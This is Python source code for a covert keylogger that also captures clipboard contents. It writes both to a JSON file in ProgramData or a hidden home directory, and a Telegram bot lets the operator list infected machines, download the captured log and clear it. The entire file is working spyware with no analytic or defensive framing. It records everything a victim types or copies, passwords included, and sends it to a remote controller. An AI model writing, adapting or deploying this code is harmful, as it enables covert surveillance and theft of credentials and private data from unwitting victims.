import os
import json
import pyperclip
from pynput import keyboard
from datetime import datetime, timedelta
import platform
import time
from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, CallbackContext
import logging

# Initialize Telegram bot with token
TELEGRAM_BOT_TOKEN = "TELEGRAM_BOT_TOKEN"
bot = Bot(TELEGRAM_BOT_TOKEN)

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Path setup for keylogger file
json_file_path = os.path.join(
    os.environ['ProgramData'] if os.name == 'nt' else os.path.expanduser('~/.hidden_dir'), 
    'keylog.json'
)
if not os.path.exists(os.path.dirname(json_file_path)):
    os.makedirs(os.path.dirname(json_file_path))

# Initialize JSON log file
if not os.path.exists(json_file_path):
    with open(json_file_path, 'w') as file:
        json.dump([], file)

# Tracking variables
devices = {platform.node(): f"{platform.node()} ({platform.system()} {platform.release()})"}
selected_device, last_timestamp, last_clipboard_content = None, datetime.now() - timedelta(minutes=15), None

# Utility functions for JSON data
def update_json(data): 
    with open(json_file_path, 'w') as file: json.dump(data, file, indent=4)

def log_event(key):
    global last_timestamp
    data, current_time = load_json(), datetime.now()
    if current_time - last_timestamp >= timedelta(minutes=15):
        data.append({'timestamp': str(current_time), 'event': 'Timestamp logged'})
        last_timestamp = current_time
    data.append({'key': str(key).replace("'", "")})
    update_json(data)

def load_json():
    with open(json_file_path, 'r') as file: return json.load(file)

# Command functions
def start(update: Update, context: CallbackContext):
    device_list = "\n".join([f"{i+1}. {name}" for i, name in enumerate(devices.values())])
    instructions = (
        "Commands:\n/start - List devices\n/select <num> - Select device\n"
        "/unselect - Unselect device\n/get - Get log\n/clear - Clear log\n\nAvailable Devices:\n" + device_list
    )
    update.message.reply_text(instructions)

def select_device(update: Update, context: CallbackContext):
    global selected_device
    try:
        selected_device = list(devices.keys())[int(context.args[0]) - 1]
        update.message.reply_text(f"Selected {devices[selected_device]}")
    except (IndexError, ValueError):
        update.message.reply_text("Invalid selection")

def unselect_device(update: Update, context: CallbackContext):
    global selected_device
    selected_device = None
    update.message.reply_text("Device unselected")

def get_json(update: Update, context: CallbackContext):
    if selected_device and os.path.exists(json_file_path):
        update.message.reply_document(open(json_file_path, 'rb'))
    else:
        update.message.reply_text("No device selected or log missing.")

def clear_json(update: Update, context: CallbackContext):
    if selected_device:
        update_json([])
        update.message.reply_text("JSON log reset.")
    else:
        update.message.reply_text("No device selected")

# Run keyboard listener
keyboard.Listener(on_press=lambda key: log_event(key)).start()

# Clipboard logger
def clipboard_loop():
    global last_clipboard_content
    while True:
        clipboard_data = pyperclip.paste()
        if clipboard_data != last_clipboard_content and clipboard_data:
            data = load_json()
            data.append({'timestamp': str(datetime.now()), 'copied': clipboard_data})
            update_json(data)
            last_clipboard_content = clipboard_data
        time.sleep(5)

# Telegram bot setup
def main():
    updater = Updater(TELEGRAM_BOT_TOKEN)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("select", select_device))
    dp.add_handler(CommandHandler("unselect", unselect_device))
    dp.add_handler(CommandHandler("get", get_json))
    dp.add_handler(CommandHandler("clear", clear_json))

    updater.start_polling()
    clipboard_loop()

if __name__ == '__main__':
    main()
